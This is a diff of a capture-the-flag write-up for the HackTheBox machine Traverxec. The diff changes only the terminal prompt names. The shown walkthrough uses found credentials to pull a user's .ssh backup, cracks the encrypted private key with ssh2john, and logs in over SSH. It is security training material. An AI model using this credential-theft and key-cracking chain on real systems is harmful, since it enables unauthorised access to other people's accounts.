@@ -173,32 +173,32 @@ index.html  protected-file-area
 ```
 I then visite `/david/public_www/protected-file-area/` it ask for a credential, I gave it `david:Nowonly4me` and we can see the zip file. download + unpack it.
 ```
-[10.10.14.43]-kali@kali:~/HTB/traverexc$ cd home/
-[10.10.14.43]-kali@kali:~/HTB/traverexc/home$ ls
+[10.10.14.43]-bibo318@parrot:~/HTB/traverexc$ cd home/
+[10.10.14.43]-bibo318@parrot:~/HTB/traverexc/home$ ls
 david
-[10.10.14.43]-kali@kali:~/HTB/traverexc/home$ da
+[10.10.14.43]-bibo318@parrot:~/HTB/traverexc/home$ da
 bash: da: command not found
-[10.10.14.43]-kali@kali:~/HTB/traverexc/home$ cd david/
-[10.10.14.43]-kali@kali:~/HTB/traverexc/home/david$ ls
-[10.10.14.43]-kali@kali:~/HTB/traverexc/home/david$ ls -la
+[10.10.14.43]-bibo318@parrot:~/HTB/traverexc/home$ cd david/
+[10.10.14.43]-bibo318@parrot:~/HTB/traverexc/home/david$ ls
+[10.10.14.43]-bibo318@parrot:~/HTB/traverexc/home/david$ ls -la
 total 12
 drwxr-xr-x 3 kali kali 4096 Nov 13 18:42 .
 drwxr-xr-x 3 kali kali 4096 Nov 13 18:42 ..
 drwx------ 2 kali kali 4096 Oct 25  2019 .ssh
-[10.10.14.43]-kali@kali:~/HTB/traverexc/home/david$ cd .ssh/
-[10.10.14.43]-kali@kali:~/HTB/traverexc/home/david/.ssh$ ls
+[10.10.14.43]-bibo318@parrot:~/HTB/traverexc/home/david$ cd .ssh/
+[10.10.14.43]-bibo318@parrot:~/HTB/traverexc/home/david/.ssh$ ls
 authorized_keys  id_rsa  id_rsa.pub
-[10.10.14.43]-kali@kali:~/HTB/traverexc/home/david/.ssh$ 
+[10.10.14.43]-bibo318@parrot:~/HTB/traverexc/home/david/.ssh$ 
 ```
 we found his private key but it is encrypted! let use ssh2john to convert it into hash and use colabcat to crack it again!!
 ```console
-kali@kali:~/HTB/traverexc/home/david/.ssh$ find / -name ssh2john* 2> /dev/null
+bibo318@parrot:~/HTB/traverexc/home/david/.ssh$ find / -name ssh2john* 2> /dev/null
 /usr/share/john/ssh2john.py
-kali@kali:~/HTB/traverexc/home/david/.ssh$ /usr/share/john/ssh2john.py id_rsa > dave.txt
+bibo318@parrot:~/HTB/traverexc/home/david/.ssh$ /usr/share/john/ssh2john.py id_rsa > dave.txt
 ```
 I dunno why I call him dave... it david lol. I guess coz I know someone irl name dave. After few 2 sec work on `Colabcat` we got the password `hunter`
 ```console
-[10.10.14.43]-kali@kali:~/HTB/traverexc/home/david/.ssh$ ssh david@10.10.10.165 -i id_rsa 
+[10.10.14.43]-bibo318@parrot:~/HTB/traverexc/home/david/.ssh$ ssh david@10.10.10.165 -i id_rsa 
 Enter passphrase for key 'id_rsa': 
 Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
 david@traverxec:~$ cat user.txt 
